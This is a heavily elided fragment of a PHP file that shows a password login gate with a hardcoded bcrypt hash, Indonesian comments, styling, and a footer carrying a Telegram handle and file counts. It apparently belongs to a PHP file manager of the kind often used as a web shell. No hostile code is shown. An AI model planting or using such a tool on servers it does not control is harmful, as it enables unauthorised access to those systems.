...
// Generate hash: echo password_hash('your_password', PASSWORD_BCRYPT);
// Default password: "" (GANTI INI!)
$PASSWORD_HASH = '$2a$12$C.CZmBymOjmNKLJ5W1Xpou8e7WpaPTcTvCbifazb2znxSwnLSIpWa'; // hash untuk ""
...
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ...
    <style>:root{--a:#0a0e1a;--b:#111827;--c:#1a2235;--e:#2d3f5e;--f:#e8edf5;--g:#8898b3;--i:#4f8ef7;--l:#f87171}*{box-sizing:border-box;margin:0;padding:0}body{background:var(--a);color:var(--f);font-family:system-ui,-apple-system,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.login-box{background:var(--b);border:1px solid var(--e);border-radius:12px;padding:32px;width:100%;max-width:400px;box-shadow:0 4px 24px rgba(0,0,0,.45)}.logo{width:64px;height:64px;background:linear-gradient(135deg,var(--i),#a78bfa);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 20px}h1{font-size:24px;text-align:center;margin-bottom:8px}p{color:var(--g);text-align:center;font-size:14px;margin-bottom:24px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;font-size:13px;font-weight:600;color:var(--g)}input[type="password"]{width:100%;padding:12px;background:var(--a);border:1px solid var(--e);border-radius:8px;color:var(--f);font-family:inherit;font-size:14px;outline:none;transition:border .15s}input[type="password"]:focus{border-color:var(--i)}.btn{width:100%;padding:12px;background:rgba(79,142,247,.15);color:var(--i);border:1px solid rgba(79,142,247,.3);border-radius:8px;font-family:inherit;font-size:14px;font-weight:600;cursor:pointer;transition:all .18s}.btn:hover{background:rgba(79,142,247,.25);transform:translateY(-1px)}.error{background:rgba(248,113,113,.1);color:var(--l);padding:12px;border-radius:8px;margin-bottom:20px;font-size:13px;text-align:center;border-left:3px solid var(--l)}</style>
    </head>
    <body>
    <div class="login-box">
        <div class="logo">🔒</div>
        ...
        <form method="post">
            <div class="form-group">
                ...
                <input type="password" id="pwd" name="login_password" required autofocus>
            </div>
...
<div class="foot">t.me/carles3kali v3.0 🔒 2026 · <?=count($dirs)?> folder<?=count($dirs)!=1?'s':''?>, <?=count($files)?> file<?=count($files)!=1?'s':''?></div>
</div>
